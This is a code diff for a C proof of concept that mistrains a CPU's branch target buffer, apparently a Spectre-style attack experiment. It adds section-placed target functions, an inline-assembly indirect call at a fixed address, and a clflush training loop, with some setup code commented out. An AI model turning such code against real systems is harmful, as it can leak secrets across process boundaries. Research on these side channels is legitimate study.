@@ -14,22 +14,45 @@
  * in the "victim" process we are trying to
  * (mis)train the processor's BTB to call
  */
+
+
+void target_fn2(void) __attribute__((section(".targetfn2")));
+void target_fn2(void)
+{
+
+}
+
+
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void) {
+    asm volatile(
+        //"movabs    $0x460000, %%rbx\n"
+        "movabs     0x450000, %%rax\n"
+        //"add (%%rbx), %%rax\n"
+        "callq *%%rax\n" :::"rax","rbx");
+
+
+    /*
+    asm volatile(
+	    "add (%%rbx), %%rax\n"
+        "callq *%%rax\n" :: "a"(fn_ptr2), "b"(&jmp_ptr2) :);
+    */
 }
 
 
 #define TARGET_FN_ADDR 0x414100401000
-uint64_t jmp_ptr;
 void *map;
+uint64_t jmp_ptr;
 
 void train()
 {
     fn_ptr = target_fn;
+    fn_ptr2 =target_fn2;
     //fn_ptr = map+600;
     printf("fn_ptr: %p\n", fn_ptr);
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
+    jmp_ptr2 = 0;
     while (1) {
         _mm_clflush(fn_ptr);
         _mm_clflush(&jmp_ptr);
@@ -48,6 +71,7 @@ int main(int argc, char *argv[])
 
     printf("training...\n");
 
+    /*
     uint64_t base = TARGET_FN_ADDR;
     if (argc > 1) {
         base = strtoll(argv[1], NULL, 16);
@@ -62,7 +86,7 @@ int main(int argc, char *argv[])
 
     // Set it to just immediately return (retq = 0xc3)...
     memset(map+600, '\xc3', 1);
-
+    */
 
     train();
 
